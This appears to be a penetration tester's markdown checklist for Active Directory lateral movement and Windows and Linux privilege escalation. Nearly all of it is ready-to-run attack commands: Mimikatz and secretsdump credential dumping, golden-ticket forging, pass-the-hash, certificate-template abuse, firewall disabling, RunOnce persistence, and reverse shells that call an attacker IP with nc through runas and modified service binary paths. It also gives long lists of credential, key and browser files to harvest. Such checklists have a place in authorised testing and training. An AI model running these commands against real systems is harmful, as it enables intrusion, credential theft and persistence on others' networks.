- [ ] **Lateral Movement / Dump Creds** (Requires the Admin access gained in the previous step)
- [ ] **BloodHound / Sharphound**
- [ ] Run BloodHound Python ingestor from Kali (if valid creds): `bloodhound-python -u 'USER' -p 'PASS' -ns IP -d DOMAIN -c All`   
- [ ] Upload SharpHound.exe and run `SharpHound.exe -c All`
- [ ] Analyze for:
    - [ ] AS-REP Roasting (DontRequirePreAuth)
    - [ ] Kerberoasting
    - [ ] DCSync rights
    - [ ] Constrained/Unconstrained Delegation
    - [ ] GenericAll / ForceChangePassword on other objects
- [ ] **Lateral Movement / Dump Creds**
- [ ] Secretsdump (DCSync): `impacket-secretsdump domain/user:pass@IP`
- [ ] Mimikatz (On Windows):
    - [ ] `privilege::debug`
    - [ ] `sekurlsa::logonpasswords`
    - [ ] `lsadump::lsa /patch`
- [ ] Token Impersonation (Incognito) via Metasploit or native tools.
- [ ] **Coercion**
- [ ] PetitPotam (Force authentication to our listener/responder)
- [ ] PrinterBug
- [ ] **Extract LAPS Passwords (Appended)**
    - [ ] Use `netexec smb <IP> -u user -p pass -M laps`

**Password Reusage**

**Spraying**

**Same principle as other things discussed, we make a list out of everything we see and every username, name, version is valuable to us.**

##### AFTER GETTING A SHELL

1. Domain Situational Awareness

- [ ] **Am I in a domain?**
    - [ ] `systeminfo | findstr /B /C:"Domain"`
    - [ ] check [[1. QUICK CHECKS]]
    - [ ] `net config workstation` (Look for "Workstation domain")
    - [ ] `echo %USERDNSDOMAIN%`
    - [ ] `echo %LOGONSERVER%` (Identifies the DC usually)
- [ ] **Who am I?**
    
    - [ ] `whoami /all` (Check Group memberships like "Domain Admins" or specific groups)
    - [ ] `net user /domain %username%`
- [ ] **Where is the DC?**
    - [ ] `nltest /dclist:<DomainName>`
    - [ ] `nslookup <DomainName>`
    - [ ] `net group "Domain Controllers" /domain`

2. Domain Enumeration (Internal)

- [ ] **Upload Tools** (If possible, otherwise use Living off the Land)
    - [ ] SharpHound.exe (BloodHound Collector) - **PRIORITY #1**
    - [ ] PowerView.ps1
    - [ ] ADSearch.exe
    - [ ] Ligolo-ng / Chisel (For pivoting)
- [ ] **Users & Groups**
    - [ ] `net user /domain` (List all users)
    - [ ] `net group /domain` (List all groups)
    - [ ] `net group "Domain Admins" /domain` (Who are the targets?)
    - [ ] `net localgroup Administrators /domain` (Who can access this box?)
- [ ] **PowerView / SharpView Enumeration**
    
    - [ ] `Get-NetDomain`
    - [ ] `Get-NetUser`
    - [ ] `Get-NetComputer`
    - [ ] `Get-NetGroup`
    - [ ] `Get-NetGPO`
    - [ ] `Find-LocalAdminAccess` (Crucial for lateral movement)
    - [ ] `Get-NetSession -ComputerName <DC_IP>` (Who is logged in where?)

3. Active Directory Attacks (Internal)

- [ ] **AS-REP Roasting** (From internal)
    
    - [ ] Rubeus: `.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`
- [ ] Try [[silver-ticket-attack]]
- [ ] **Kerberoasting** (From internal)
    - [ ] Rubeus: `.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.kerberoast`
    - [ ] PowerView: `Get-NetUser -SPN`
- [ ] **Token Impersonation** (If you are Admin/System)
    
    - [ ] Incognito (Metasploit)
    - [ ] Mimikatz: `token::elevate` then `lsadump::sam`
- [ ] **Credential Dumping** (If you are Admin/System)
    - [ ] Mimikatz: `sekurlsa::logonpasswords`
    - [ ] Mimikatz: `lsadump::lsa /patch`
    - [ ] Task Manager > Right Click LSASS > Create Dump File > Download to Kali > `pypykatz lsa minidump lsass.dmp`
- [ ] **GPO Abuse**
    
    - [ ] Check BloodHound for "GenericWrite", "WriteDacl" on GPOs.
    - [ ] SharpGPOAbuse.exe
- [ ] **ADCS (Certificates)**
    
    - [ ] Certify.exe: `.\Certify.exe find /vulnerable`
    - [ ] Look for "ESC1", "ESC8" (PetitPotam)
- [ ] **ADCS Exploitation (Certipy / Impacket) (Appended)**
    
    - [ ] **ESC1 (Request Cert):** `certipy req -u <User>@<DOMAIN> -p <Pass> -ca <CA_NAME> -target <DC_IP> -template <Template> -upn administrator@<DOMAIN>`
    - [ ] **ESC8 (Relay):** `certipy relay -target <CA_IP>` and trigger coercion via `impacket-coercer` or `PetitPotam`.
    - [ ] **Auth with Cert:** `certipy auth -pfx administrator.pfx -dc-ip <DC_IP>` (Outputs NTLM hash).
- [ ] **Kerberos Tickets (Golden/Silver) (Appended)**
    
    - [ ] Extract `krbtgt` hash via DCSync: `impacket-secretsdump <DOMAIN>/<User>:<Pass>@<DC_IP> -just-dc-user krbtgt`
    - [ ] Forge Golden Ticket: `impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain <DOMAIN> Administrator`

4. Lateral Movement (Pivoting)

- [ ] **WinRM** (If you have creds and port 5985 is open)
    - [ ] `evil-winrm -i <TargetIP> -u <User> -p <Pass>`
- [ ] **SMB / PsExec** (If you have Admin creds and port 445 is open)
    - [ ] `impacket-psexec <Domain>/<User>:<Pass>@<TargetIP>`
    - [ ] `impacket-smbexec <Domain>/<User>:<Pass>@<TargetIP>`
- [ ] **WMI (Stealthier Alternative to PsExec) (Appended)**    
    - [ ] `impacket-wmiexec <Domain>/<User>:<Pass>@<TargetIP>`    
- [ ] **Pass-The-Hash** (If you only have NTLM hash)
    - [ ] `evil-winrm -i <TargetIP> -u <User> -H <Hash>`
    - [ ] `impacket-wmiexec -hashes 00000000000000000000000000000000:<Hash> <User>@<TargetIP>`
- [ ] **Overpass-The-Hash** (Turn hash into Ticket)
    - [ ] Rubeus: `asktgt /user:<User> /rc4:<Hash> /ptt`
- [ ] **Pass-The-Ticket (Appended)**
    - [ ] Set environment variable (Linux): `export KRB5CCNAME=ticket.ccache`
    - [ ] Use ticket: `impacket-psexec -k -no-pass <Domain>/<User>@<TargetMachine>`
- [ ] **SSH Tunneling**
    - [ ] `ssh -N -D 1080 user@pivot-machine` (Dynamic Port Forward)
    - [ ] Update `/etc/proxychains.conf`

---

### Privilege Escalation

#### Windows

- [ ] Enumerate current user and its permissions
- [ ] Check the privileges
  * [ ] SeImpersonate
  * [ ] SeLoadDriver
  * [ ] SeRestore
  * [ ] SeImpersonatePrivilege
  * [ ] SeAssignPrimaryPrivilege
  * [ ] SeTcbPrivilege
  * [ ] SeBackupPrivilege
  * [ ] SeRestorePrivilege
  * [ ] SeCreateTokenPrivilege
  * [ ] SeLoadDriverPrivilege
  * [ ] SeTakeOwnershipPrivilege 
  * [ ] SeDebugPrivilege
  * [ ] SeManageVolumePrivilege

- [ ] Transfer winpeas
- [ ] Transfer PowerUp
- [ ] Seatbelt
- [ ] Sherlock
- [ ] Rubeus
- [ ] SharpHound
- [ ] General users enum
```powershell
whoami /all
net users %username%
net users
Get-WmiObject -Class Win32\_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
- [ ] General groups enum
```powershell
net localgroup
net localgroup Administrators
```
- [ ] Check if current user has these tokens:
```powershell
SeImpersonatePrivilege
SeAssignPrimaryPrivilege
SeTcbPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeCreateTokenPrivilege
SeLoadDriverPrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeManageVolumePrivilege
```
##### **Exploiting Tokens**
- [ ] SeImpersonatePrivilege:
	- [ ] PrintSpoofer.exe
	- [ ] GodPotato / RoguePotato / JuicyPotatoNG
- [ ] SeBackupPrivilege:
	- [ ] Copy SAM and SYSTEM registry hives to temp folder
##### **System Enumeration**

- [ ] Windows version
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
- [ ] Installed patches and updates
```powershell
wmic qfe
```
- [ ] Architecture
```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```
- [ ] Environment variables
```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```
- [ ] Drives
```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\\FileSystem"}| ft Name,Root
```

##### **Network Enumeration**

ARE THE RUNNING SERVICES RUNNING AS OTHER USERS? CAN WE MODIFY THE WEBSTE MAYBE BY PASTING A PHP FILE THAT RUNS AS THE USER WHO HOSTS THE WEBSITE

- [ ] TRANSFER PLINK
- [ ] List all NICs, IP and DNS
```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
- [ ] List routing table
```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
- [ ] List ARP table
```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
- [ ] List current connections
```powershell
netstat -ano
```
- [ ] List current connections correlated to running service (requires elevated privs)
```powershell
netstat -bona
```
- [ ] List firewall state and config
```powershell
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```
- [ ] List firewall's blocked ports
```powershell
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```
- [ ] Disable firewall
```powershell
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
```
- [ ] List network shares
```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```
- [ ] SNMP config
```powershell
reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse
```

##### **Credential Access**

- [ ] Go from **medium mandatory level** to **high mandatory level**
```powershell
powershell.exe Start-Process cmd.exe -Verb runAs
```
- [ ] **TRY KNOWN PASSWORDS!**
```powershell
# check also with runas
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
- [ ] Creds from config files (Try different words e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth):
```d
dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
findstr /si /m password *.xml *.ini *.txt
```
- [ ] Creds from local DBs
- [ ] Creds from Windows Vault
```d
cmdkey /list

# Look for "Target: Domain:interactive=[User]". This indicates a stored credential for that specific user.
# if found 
runas /savecred /user:WORKGROUP\Administrator "\\attacker-ip\SHARE\welcome.exe"
```
- [ ] Creds from Registry
```powershell
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# **Check for startup registries and for applications that are run on   # startup by any user on the computer** :
 `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
 # curl can overwrite the file for a reverse shell.
# Same thing but runs once and then deletes itself:
 `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
 Then :`reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v revshell /t REG_SZ /d "<FILE PATH TO EXECUTE>" /f`

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 

# SNMP parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty credentials
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\

# VNC credentials
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password

## OpenSSH credentials
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
- [ ] Creds from Unattend or Sysprep Files
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattend*.xml
%WINDIR%\Panther\Unattend*.xml
```
- [ ] Creds from Log Files
```
dir /s /b /p *access*.log* == *.log
```
- [ ] Creds from IIS web config
```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```
- [ ] Check other possible interesting files
```powershell
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
setupinfo
setupinfo.bak
key3.db #Firefox
key4.db #Firefox
places.sqlite #Firefox
"Login Data" #Chrome
Cookies #Chrome
Bookmarks #Chrome
History #Chrome
TypedURLsTime #IE
TypedURLs #IE
```
- [ ] Creds from WiFi
```powershell
# 1. Find AP SSID
netsh wlan show profile
# 2. Get cleartext password
netsh wlan show profile <SSID> key=clear
# OR
# Go hard and grab 'em all
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
- [ ] Creds from sticky notes app
```powershell
c:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
- [ ] Creds stored in services
```powershell
# SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
# https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
```
- [ ] Creds from Powershell History
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
- [ ] Creds from [alternate data stream](https://owasp.org/www-community/attacks/Windows_alternate_data_stream)
```powershell
Get-Item -path <filename> -Stream *
Get-Content -path <filename> -Stream <keyword>
```
- [ ] SAM & SYSTEM bak
```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
- [ ] Cloud credentials
```powershell
# From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
- [ ] Cached [GPP password](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)
```powershell
# Before Vista look inside
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
# After Vista look inside
C:\ProgramData\Microsoft\Group Policy\history
# Look for
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml

# Decrypt the passwords with
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
- [ ] Saved RDP connections
```powershell
HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
HKCU\Software\Microsoft\Terminal Server Client\Servers\
```
- [ ] Remote desktop credential manager
```powershell
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
- [ ] SCClient \ SCCM
```powershell
# Check if the retrieved sotfwares are vulnerable to DLL Sideloading
# https://github.com/enjoiz/Privesc
$result = Get-WmiObject -Namespace "root\\ccm\\clientSDK" -Class CCM\_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
- [ ] Check recycle bin
##### **Exploit**

- [ ] Services running on localhost
- [ ] Kernel version
```powershell
# List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
# to cross compile a program from Kali
$ i586-mingw32msvc-gcc -o adduser.exe useradd.c
```
- [ ] Software versions
- [ ] Service versions

##### **Misconfiguration**

- [ ] Services
- [ ] Can we restart the machine?
*   [ ] Can we start and stop the service?
- [ ] identify applications running as SYSTEM
```powershell
#DOS
tasklist /V | findstr /I "SYSTEM"

#powershell
# List all running services and their binary paths
wmic service where "state='running'" get name, displayname, pathname, startname | findstr /i "LocalSystem"
```
- [ ] Check permissions
```powershell
# using sc
sc qc <service_name>

# using accesschk.exe
accesschk.exe -ucqv <Service_Name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version

# using msf
exploit/windows/local/service_permissions    
```
- [ ] Unquoted Service Path
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""

wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" 

#Not only auto services
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
```
*   [ ] Change service binary path
```powershell
# if the group "Authenticated users" has SERVICE_ALL_ACCESS
# it can modify the binary path
# bind shell
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

# reverse shell
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"

# add user to local admin group
sc config <Service_Name> binpath= "net localgroup administrators username /add"

# example using SSDPRV
sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

# then restart the service
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
*   [ ] DLL Hijacking / Overwrite service binary
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"

# do it by using sc
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
*   [ ] Registry modify permissions
```powershell
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

# if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
# it can be leveraged to change the binary path inside the registry
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
- [ ] Installed applications
*   [ ] DLL Hijacking for installed applications
```powershell
dir /a "C:\Program Files"

dir /a "C:\Program Files (x86)"

reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

```
*   [ ] Write permissions
```powershell
# using accesschk.exe

accesschk.exe /accepteula

# Find all weak folder permissions per drive.

accesschk.exe -uwdqs Users c:

accesschk.exe -uwdqs "Authenticated Users" c:

accesschk.exe -uwdqs "Everyone" c:\

# Find all weak file permissions per drive.

accesschk.exe -uwqs Users c:*.*

accesschk.exe -uwqs "Authenticated Users" c:*.*

accesschk.exe -uwdqs "Everyone" c:*.*

# using icalcs

icacls "C:\Program Files*" 2>nul | findstr "(F) (M) :" | findstr ":\ everyone authenticated users todos %username%"

icacls ":\Program Files (x86)*" 2>nul | findstr "(F) (M) C:" | findstr ":\ everyone authenticated users todos %username%"

# using Powershell

Get-ChildItem 'C:\Program Files*','C:\Program Files (x86)*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files*','C:\Program Files (x86)*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}

```
*   [ ] PATH DLL Hijacking
```powershell
# having write permissions inside a folder present ON PATH could bring to DLL hijacking
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
*   [ ] AlwaysInstallElevated set in Registry
```powershell
# if both are enabled (set to 0x1), it's possible to execute
# any .msi as NT AUTHORITY\SYSTEM
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# check with msf
exploit/windows/local/always_install_elevated

# generate payload with msfvenom
# no uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
# using the msiexec the uac wont be prompted
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi

# install .msi
msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
```
*   [ ] Scheduled tasks
```powershell
# using schtasks
schtasks /query /fo LIST /v
# filtering the output
schtasks /query /fo LIST /v | findstr /v "\Microsoft"

# using powershell
Get-ScheduledTask | ft TaskName,TaskPath,State
# filtering the output
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | Select-Object TaskName, TaskPath, State, @{N='Action';E={$_.Actions.Execute}} | ft -AutoSize
```
- [ ] Executable file writeable
- [ ] Dependency writeable
- [ ] Sensitive files readable
- [ ] SAM Hive
- [ ] SYSTEM Hive
*   [ ] Windows Subsystem For Linux

```powershell
wsl whoami
./ubuntum2004.exe config --default-user root
wsl whoami
wsl python -c 'put here your command'
```

- [ ] Navigate to the fileystem and look for weird folders that contain weird scripts that run every so often, replace them if we can.

#### Linux

Principles to becoming root!

1. `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`
2. Adding a new user
3. Make the user run commands without needing password `sudo -l`

- [ ] Upgrade shell using socat, else python
- [ ] Are we in a dock container? If so this can be seen by doing an ls - [ ]la. See how to escape from the notes
- [ ] Run linpeas.sh
- [ ] Run SUDO Killer if we have full SSH creds
- [ ] Run [SUID3Emum](https://github.com/Anon-Exploiter/SUID3NUM.git)
- [ ] Go Thru the linpeas.sh output
- [ ] PwnKit? This is an easy win.
- [ ] enumerate users
- [ ] Look for other users
- [ ] Try to switch users and rerun enumeration
  * [ ] Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret)
- [ ] Enumerate groups
- [ ] Are these exploitable?
- [ ] lxd
- [ ] davfs
- [ ] sudo
- [ ] fail2ban Any accessible sensitive file?
- [ ] /etc/passwd
- [ ] /etc/shadow
- [ ] /etc/sudoers
- [ ] Configuration files
- [ ] /root/.ssh/id_rsa
- [ ] entire root folder
*   [ ] Check env info
 `(env || set) 2>/dev/null    echo $PATH`  
- [ ] Look through SUID set and run it with `-p` flag to preserve privileges.
- [ ] refer to gtfobins for this
- [ ] Can we write them?
- [ ] google everything
- [ ] LOOK EVEN FOR CUSTOM ONES AND USE THEM!
  * [ ] Are these missing libraries?
	* [ ] Do we have write access to the LD_LIBRARY_PATH? IF yes
	* [ ] Generate our own .so file and paste it in the writable path
- [ ] Enumerate internal running services
- [ ] If there is a website play with curl
- [ ] Are these running as other users that we can become?
- [ ] If there is a database running we can enuemrate for credentials to test for UDF
  * [ ] mysql -uroot -pdasdasd
- [ ] Remote port forward if we have SSH access.
- [ ] Init, init.d systemd Services?
- [ ] Can we overwrite them?
- [ ] Can we start and stop the service
- [ ] Can we reboot the machine?
- [ ] Check for Cronjobs
- [ ] Can we overwrite them
- [ ] Are these missing a library when running?
- [ ] Can we overwrite the library path
- [ ] GOOGLE EVERYTHING HERE ,some custom scripts have vulnerable expressions.
- [ ] Password Search
- [ ] Try known passwords
*   [ ] Search creds from config files (Try different word other than PASSWORD, e.g: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth, secret):
```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
locate password | more
```
*   [ ] Search creds in common files:
```bash
history
cat ~/.bash_history
```
- [ ] Search creds from local DBs
*   [ ] Search creds from bash history:
```bash
history
cat ~/.bash_history
```

*   [ ] Search creds from memory:

```bash
strings /dev/mem -n10 | grep -i PASS
```
*   [ ] SSH keys:
```bash
cat ~/.ssh/id_rsa
ls ~/.ssh/*
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```
*   [ ] Search rsync config file
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
- [ ] Transfer Linux Exploit Suggester
- [ ] Try the most probable exploits
- [ ] Enumerate processes that run as root and look for weird things.
- [ ] use PSPY
- [ ] Enumerate the file system and see if there are weird files that we can overwrite
- [ ] check /opt and /srv, expecting to find both empty
- [ ] you could also try find / - [ ]name "*.py"
- [ ] Check for weird folders and see if tehre are any bash scripts that we could also modify
- [ ] python scripts
- [ ] perl i dont know
- [ ] **Capabilities**
- [ ] `getcap -r / 2>/dev/null`
- [ ] Check GTFOBins for capabilities exploitation
- [ ] **NFS Root Squash**
- [ ] `cat /etc/exports`
- [ ] Look for `no_root_squash` (exploitable if we can mount from attacker machine)
- [ ] **Wildcard Injection**
- [ ] Check for cronjobs using `tar *`, `rsync *`
- [ ] **System Timers**
- [ ] `systemctl list-timers --all`

---